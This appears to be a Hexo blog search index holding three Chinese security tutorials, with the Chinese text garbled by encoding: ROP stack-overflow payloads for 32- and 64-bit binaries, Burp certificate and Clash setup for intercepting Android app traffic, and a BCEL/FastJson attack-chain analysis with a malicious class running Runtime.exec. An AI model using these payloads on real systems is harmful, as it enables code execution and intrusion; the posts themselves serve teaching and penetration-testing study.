<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>32ä½ä¸64ä½ROPè¯¦è§£</title>
    <url>/PWN/32%E4%BD%8D%E4%B8%8E64%E4%BD%8DROP%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åšpwnçš„å‰ç½®çŸ¥è¯†ï¼Œå†™EXPè¦ç”¨åˆ°ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown93016202_p0.jpg"></p>
<span id="more"></span>

<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="ä»€ä¹ˆæ˜¯ROP"><a href="#ä»€ä¹ˆæ˜¯ROP" class="headerlink" title="ä»€ä¹ˆæ˜¯ROP"></a>ä»€ä¹ˆæ˜¯ROP</h2><p>ROPçš„å…¨ç§°ä¸º<code>Return-oriented programming</code>ï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºé¢å‘è¿”å›åœ°å€çš„ç¼–ç¨‹ï¼Œè¿™æ˜¯ä¸€ç§é«˜çº§çš„å†…å­˜æ”»å‡»æŠ€æœ¯å¯ä»¥ç”¨æ¥ç»•è¿‡ç°ä»£æ“ä½œç³»ç»Ÿçš„å„ç§é€šç”¨é˜²å¾¡ï¼ˆæ¯”å¦‚å†…å­˜ä¸å¯æ‰§è¡Œå’Œä»£ç ç­¾åç­‰ï¼‰ã€‚é€šè¿‡ä¸Šä¸€ç¯‡æ–‡ç« æ ˆæº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æ ˆæº¢å‡ºçš„æ§åˆ¶ç‚¹æ˜¯retå¤„ï¼Œé‚£ä¹ˆROPçš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åˆ©ç”¨ä»¥retç»“å°¾çš„æŒ‡ä»¤åºåˆ—æŠŠæ ˆä¸­çš„åº”è¯¥è¿”å›EIPçš„åœ°å€æ›´æ”¹æˆæˆ‘ä»¬éœ€è¦çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p>
<h2 id="ä¸ºä»€ä¹ˆè¦ROP"><a href="#ä¸ºä»€ä¹ˆè¦ROP" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ROP"></a><strong>ä¸ºä»€ä¹ˆè¦ROP</strong></h2><p>æ¢ç©¶åŸå› ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯NX(DEP) NXå³No-executeï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ‰€ä»¥å°±æœ‰äº†å„ç§ç»•è¿‡åŠæ³•ï¼Œropå°±æ˜¯ä¸€ç§</p>
<h1 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h1><p>32ä½ç¨‹åºçš„æ ˆæº¢å‡ºï¼Œåªæœ‰è¾“å…¥çš„å­—èŠ‚å¡«æ»¡æ ˆç©ºé—´ï¼Œå’Œè¿”å›åœ°å€ï¼Œå³å¯åŠ«æŒæ ˆå¸§ï¼Œè¾¾åˆ°æ§åˆ¶æ‰§è¡Œæµçš„æ•ˆæœ,</p>
<p>å‡è®¾æ ˆå¼€è¾Ÿäº†20å­—èŠ‚çš„ç©ºé—´ï¼Œrbpä¸º8å­—èŠ‚ï¼Œç”±æ­¤å¯å¾—payloadå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(system_addr) + p32(bin_addr)</span><br></pre></td></tr></table></figure>




<h1 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h1><h3 id="å¯„å­˜å™¨ä¼ å‚"><a href="#å¯„å­˜å™¨ä¼ å‚" class="headerlink" title="å¯„å­˜å™¨ä¼ å‚"></a>å¯„å­˜å™¨ä¼ å‚</h3><p>64ä½å’Œ32ä½ç¨‹åºçš„ä¸åŒç‚¹ä¹‹ä¸€å°±æ˜¯ï¼Œå®ƒçš„å‰6ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œæœ‰æ›´å¤šçš„å‚æ•°æ‰ç”¨æ ˆï¼Œæ‰€ä»¥æ„é€ ropé“¾çš„æ–¹å¼å’Œ32ä½ä¸åŒã€‚</p>
<p>åˆ†åˆ«æ˜¯<code>rdi</code>ï¼Œ<code>rsi</code>ï¼Œ<code>rdx</code>ï¼Œ<code>rcx</code>ï¼Œ<code>r8</code>ï¼Œ<code>r9</code>ä½œä¸ºç¬¬1-6ä¸ªå‚æ•°ã€‚raxä½œä¸ºè¿”å›å€¼ 64ä½æ²¡æœ‰æ ˆå¸§çš„æŒ‡é’ˆï¼Œ32ä½ç”¨ebpä½œä¸ºæ ˆå¸§æŒ‡é’ˆï¼Œ64ä½å–æ¶ˆäº†è¿™ä¸ªè®¾å®šï¼Œæ‰€ä»¥rbpä½œä¸ºé€šç”¨å¯„å­˜å™¨ä½¿ç”¨ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownfMxenQwX7syu6Ri.png"></p>
<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>æ„é€ rop,æ³„éœ²å‡ºlibcåœ°å€ï¼Œè°ƒç”¨system(â€œ&#x2F;bin&#x2F;shâ€)</p>
<h3 id="gadagetå‡†å¤‡"><a href="#gadagetå‡†å¤‡" class="headerlink" title="gadagetå‡†å¤‡"></a>gadagetå‡†å¤‡</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget â€“binary xxx â€“only â€œpop|retâ€</span><br></pre></td></tr></table></figure>


<h1 id="æ³„éœ²systemåœ°å€å’Œ-x2F-bin-x2F-sh"><a href="#æ³„éœ²systemåœ°å€å’Œ-x2F-bin-x2F-sh" class="headerlink" title="æ³„éœ²systemåœ°å€å’Œ&#x2F;bin&#x2F;sh"></a>æ³„éœ²systemåœ°å€å’Œ&#x2F;bin&#x2F;sh</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br><span class="line">sh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))- libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br></pre></td></tr></table></figure>


<h1 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h1><p>64ä½è¿˜è¦è€ƒè™‘å †æ ˆå¹³è¡¡ï¼Œç”±æ­¤å¯ä»¥æœ‰3ç§payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ³„éœ²libcåœ°å€</span></span><br><span class="line">payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¬¬ä¸€ä¸ªpayloadåˆ©ç”¨retæ¥å †æ ˆå¹³è¡¡</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>




<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯„å­˜å™¨è°ƒç”¨é¡ºåºï¼šrdiã€rsiã€rdxã€rcxã€r8ã€r9</span></span><br><span class="line"><span class="comment"># å…ˆåˆ©ç”¨pop+retå°†bin_sh_addråœ°å€å¼¹åˆ°rdiå¯„å­˜å™¨ä¸­å»ï¼Œå†è°ƒç”¨systemå‡½æ•°æ¥æ‰§è¡Œ</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>


<p>å‰ä¸¤ä¸ªpayloadåˆ©ç”¨64ä½ç¨‹åºå‡½æ•°è°ƒç”¨å‚æ•°è§„åˆ™æ„é€ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// retå †æ ˆå¹³è¡¡ï¼Œç›´æ¥è¿”å›bin_sh_addrå¤„ä¹Ÿå¯ä»¥è·å¾—ç³»ç»Ÿæƒé™ã€‚</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27; * (0x0f+0x08) + p64(ret_addr) + p64(bin_sh_addr)</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶å®‰å…¨</category>
      </categories>
      <tags>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>APKæµé‡è½¬å‘</title>
    <url>/APP/APK%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä½œä¸ºä¸€ä¸ªæ¸—é€äººï¼Œä¸ä»…è¦æ—¥WEBè¿˜å¾—æ—¥appå’Œå°ç¨‹åºï¼Œç”±æ­¤å°±å†™äº†æ­¤æ–‡</p>
<span id="more"></span>

<h1 id="APKæµé‡è½¬å‘"><a href="#APKæµé‡è½¬å‘" class="headerlink" title="APKæµé‡è½¬å‘"></a>APKæµé‡è½¬å‘</h1><p>å®ç°å®‰å“APPå…¨å±€&#x2F;å•ä¸ªAPPçš„ä»£ç†</p>
<p>éœ€è¦çš„å·¥å…·æœ‰ï¼š</p>
<ul>
<li>proxifier</li>
<li>clash</li>
<li>å¤œç¥æ¨¡æ‹Ÿå™¨</li>
</ul>
<h1 id="å®‰è£…BurpSuiteè¯ä¹¦"><a href="#å®‰è£…BurpSuiteè¯ä¹¦" class="headerlink" title="å®‰è£…BurpSuiteè¯ä¹¦"></a>å®‰è£…BurpSuiteè¯ä¹¦</h1><p>å…ˆåœ¨Proxyâ†’Optionsâ†’Addé¡µé¢æ–°å»ºå±€åŸŸç½‘ä»£ç†ç«¯å£ï¼š</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png"></p>
<p>ç‚¹å‡»Import &#x2F; expoet CA certificate é€‰æ‹©Certificate in DER formatå¯¼å‡ºCAè¯ä¹¦å¹¶ä¿å­˜åˆ°æŸä¸€ä¸ªæ–‡ä»¶å¤¹ï¼š</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1.png"></p>
<p>ç„¶åå°†CAè¯ä¹¦ä¸Šä¼ åˆ°VPSå¹¶åœ¨è¯¥ç›®å½•ä¸‹ç”¨Pythonå¼€å¯httpæœåŠ¡ï¼š</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_2.png"></p>
<p>å¯åŠ¨å¤œç¥æ¨¡æ‹Ÿå™¨ï¼Œæ‰“å¼€å†…ç½®æ¸¸è§ˆå™¨ï¼Œ</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_3.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_4.png"></p>
<p>ä¸‹è½½è¯ä¹¦è‡³Downloadæ–‡ä»¶å¤¹ä¸‹ï¼ˆé»˜è®¤å°±æ˜¯Downloadç›®å½•ï¼‰ï¼š</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_5.png"></p>
<p>å›åˆ°æœ¬æœºä¸­ï¼Œæ‰“å¼€CMDçª—å£ï¼Œcdå‘½ä»¤è¿›å…¥ä¸‹è½½çš„å¤œç¥æ¨¡æ‹Ÿå™¨çš„binç›®å½•ä¸‹ï¼š</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_6.png"></p>
<p>nox_adb.exeå³ä¸ºå¤œç¥æ¨¡æ‹Ÿå™¨adbæ¨¡å¼ç«¯å£ï¼Œä½¿ç”¨nox_adb.exeæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆåˆ†å¸ƒæ‰§è¡Œï¼‰ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\nox_adb.exe root</span><br><span class="line">.\nox_adb.exe remount</span><br><span class="line">.\nox_adb.exe shell</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_7.png"></p>
<p>æ­¤æ—¶åœ¨æ­¤å¤„è¾“å…¥ï¼šcd sdcard&#x2F;Download</p>
<p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /sdcard/Download/</span><br><span class="line"><span class="built_in">mv</span> CA.der <span class="number">9</span>a5ba575.<span class="number">0</span></span><br><span class="line"><span class="built_in">mv</span> <span class="number">9</span>a5ba575.<span class="number">0</span> /system/etc/security/cacerts/</span><br><span class="line">chmod <span class="number">644</span> /system/etc/security/cacerts/<span class="number">9</span>a5ba575.<span class="number">0</span></span><br></pre></td></tr></table></figure>


<p>PSï¼š<code>æ­¤æ—¶åç¼€åä¸€å®šè¦æ˜¯xxx.derä¸æ˜¯çš„è¯è¦é‡æ–°ç”Ÿæˆè¯ä¹¦å¹¶ä¿å­˜åˆ°htdocsæ–‡ä»¶å¤¹ï¼</code></p>
<h1 id="å®‰è£…-é…ç½®Clash"><a href="#å®‰è£…-é…ç½®Clash" class="headerlink" title="å®‰è£…+é…ç½®Clash"></a>å®‰è£…+é…ç½®Clash</h1><p>ä¸‹è½½<a href="https://github.com/Kr328/ClashForAndroid/tags">clash</a></p>
<p>ä¸‹è½½å¥½ä¹‹ååœ¨å¤œç¥æ¨¡æ‹Ÿå™¨ä¸­å¯¼å…¥apkæ–‡ä»¶ï¼š</p>
<p>ç›´æ¥æ‹–å…¥å³å¯</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_8.png"></p>
<p>åœ¨æœ¬æœºä¸­æ–°å»ºä¸€ä¸ªyamlæ–‡ä»¶</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mixed-port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">global</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="comment"># http</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.106</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line">    <span class="comment"># username: username</span></span><br><span class="line">    <span class="comment"># password: password</span></span><br><span class="line">    <span class="comment"># tls: true # https</span></span><br><span class="line">    <span class="comment"># skip-cert-verify: true</span></span><br><span class="line">    <span class="comment"># sni: custom.com</span></span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Proxy</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="comment"># disable-udp: true</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">http</span></span><br></pre></td></tr></table></figure>


<p>192.168.0.106å’Œåé¢çš„ç«¯å£æ”¹ä¸ºè‡ªå·±çš„IPå’Œburpç›‘å¬çš„ç«¯å£</p>
<p>å†æŠŠæ­¤æ–‡ä»¶æ‹–å…¥å¤œç¥æ¨¡æ‹Ÿå™¨ä¸­</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_9.png"></p>
<p>æ‰“å¼€clashï¼Œç‚¹å‡»é…ç½®</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_10.png"></p>
<p>ç‚¹+å·</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_11.png"></p>
<p>å°†åˆšåˆšå†™çš„yamlæ–‡ä»¶å¯¼å…¥</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_12.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_13.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_14.png"></p>
<p>ä¹‹ååœ¨å¯åŠ¨ä»£ç†</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_15.png"></p>
<p>ç‚¹å‡»ä»£ç†</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_16.png"></p>
<p>é€‰æ‹©httpï¼ŒæŒ‰ä¸‹é—ªç”µæŒ‰é’®</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_17.png"></p>
<p>æ­¤æ—¶å°±å¯ä»¥æŠ“å–APPå…¨éƒ¨æµé‡åŒ…äº†</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_18.png"></p>
<h2 id="æŠ“å–å•ä¸ªAPPæµé‡åŒ…"><a href="#æŠ“å–å•ä¸ªAPPæµé‡åŒ…" class="headerlink" title="æŠ“å–å•ä¸ªAPPæµé‡åŒ…"></a>æŠ“å–å•ä¸ªAPPæµé‡åŒ…</h2><p>é€‰å…³é—­ä»£ç†ï¼Œå†ç‚¹è®¾å¤‡</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_19.png"></p>
<p>é€‰æ‹©ç½‘ç»œ</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_20.png"></p>
<p>å•å‡»<code>è®¿é—®æ§åˆ¶æ¨¡å¼</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_21.png"></p>
<p>é€‰æ‹©ä»…è¿è¡Œå·²é€‰æ‹©çš„åº”ç”¨</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_22.png"></p>
<p>è®¿é—®æ§åˆ¶åº”ç”¨åŒ…åˆ—è¡¨</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_23.png"></p>
<p>å³å¯æŠ“å–å•ä¸ªAPPçš„æµé‡åŒ…</p>
<p>åŒç†ï¼Œè¦æ¸—é€å°ç¨‹åºæ—¶ï¼Œå°±ä»…é€šè¿‡å¾®ä¿¡å³å¯</p>
]]></content>
      <categories>
        <category>APP</category>
      </categories>
      <tags>
        <tag>APPæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>BCEL FastJsonæ”»å‡»é“¾åˆ†æ</title>
    <url>/JAVA%E5%AE%89%E5%85%A8/BCEL%20FastJson%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote>
<p>éœ€è¦æå‰äº†è§£ä»€ä¹ˆæ˜¯<code>ç±»åŠ è½½æœºåˆ¶</code></p>
</blockquote>
<p>è®¤çœŸçœ‹å®Œäº†<code>ClassLoader</code>ï¼Œå°±æƒ³ç€å†™ä¸€ç¯‡ä¸ä¹‹ç›¸å…³çš„çš„æ”»å‡»é“¾åˆ†æã€‚</p>
<span id="more"></span>

<h1 id="BCEL-ClassLoader"><a href="#BCEL-ClassLoader" class="headerlink" title="BCEL ClassLoader"></a>BCEL ClassLoader</h1><p>æƒ³è¦äº†è§£è¿™ä¸ªæ”»å‡»é“¾ï¼Œå¾—å…ˆäº†è§£ä»€ä¹ˆæ˜¯<code>BCEL ClassLoader</code> ã€‚</p>
<p><a href="https://commons.apache.org/proper/commons-bcel/" title="BCEL">BCEL</a>ï¼ˆ<code>Apache Commons BCELâ„¢</code>ï¼‰æ˜¯ä¸€ä¸ªç”¨äºåˆ†æã€åˆ›å»ºå’Œæ“çºµJavaç±»æ–‡ä»¶çš„å·¥å…·åº“ï¼ŒOracle JDKå¼•ç”¨äº†BCELåº“ï¼Œä¸è¿‡ä¿®æ”¹äº†åŸåŒ…å<code>org.apache.bcel.util.ClassLoader</code>ä¸º<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> ã€‚</p>
<h1 id="BCELæ”»å‡»åŸç†"><a href="#BCELæ”»å‡»åŸç†" class="headerlink" title="BCELæ”»å‡»åŸç†"></a>BCELæ”»å‡»åŸç†</h1><p>æˆªå–BCELçš„ClassLoaderç±»éƒ¨åˆ†ä»£ç ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="string">&quot;$$BCEL$$&quot;</span>.length());</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">            <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            clazz = parser.parse();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">            var8.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line">        <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(), (<span class="type">byte</span>)<span class="number">7</span>);</span><br><span class="line">        <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(), (<span class="type">byte</span>)<span class="number">1</span>);</span><br><span class="line">        name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”±ä»¥ä¸Šæºç å¯ä»¥çœ‹å‡ºBCELçš„ç±»åŠ è½½å™¨åœ¨è§£æç±»åæ—¶ä¼šå¯¹ClassNameä¸­æœ‰<code>$$BCEL$$</code>æ ‡è¯†çš„ç±»åšç‰¹æ®Šå¤„ç†ã€‚</p>
<p>å½“BCELçš„<code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code>åŠ è½½ä¸€ä¸ªç±»åä¸­å¸¦æœ‰<code>$$BCEL$$</code>çš„ç±»æ—¶ä¼šæˆªå–å‡º<code>$$BCEL$$</code>åé¢çš„å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨<code>com.sun.org.apache.bcel.internal.classfile.Utility#decode</code>å°†å­—ç¬¦ä¸²è§£ææˆç±»å­—èŠ‚ç ï¼ˆå¸¦æœ‰æ”»å‡»ä»£ç çš„æ¶æ„ç±»ï¼‰ï¼Œæœ€åä¼šè°ƒç”¨<code>defineClass</code>æ³¨å†Œè§£ç åçš„ç±»ï¼Œä¸€æ—¦è¯¥ç±»è¢«åŠ è½½å°±ä¼šè§¦å‘ç±»ä¸­çš„æ¶æ„ä»£ç ã€‚</p>
<h1 id="åˆ©ç”¨BCELè¿›è¡Œå‘½ä»¤æ‰§è¡Œ"><a href="#åˆ©ç”¨BCELè¿›è¡Œå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åˆ©ç”¨BCELè¿›è¡Œå‘½ä»¤æ‰§è¡Œ"></a>åˆ©ç”¨BCELè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h1><p>æ„é€ æ¶æ„ç±»<strong>TestBCELClass</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBCELClass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span>  <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Windows&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;calc 12345678901234567&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (osName.startsWith(<span class="string">&quot;Linux&quot;</span>)) &#123;</span><br><span class="line">            command = <span class="string">&quot;curl localhost:9999/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å¯¹å…¶ä½¿ç”¨BCELç¼–ç com.anbai.sec.classloader.TestBCELClassç±»å­—èŠ‚ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bcelEncode</span><span class="params">(File classFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(FileUtils.readFileToByteArray(classFile), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

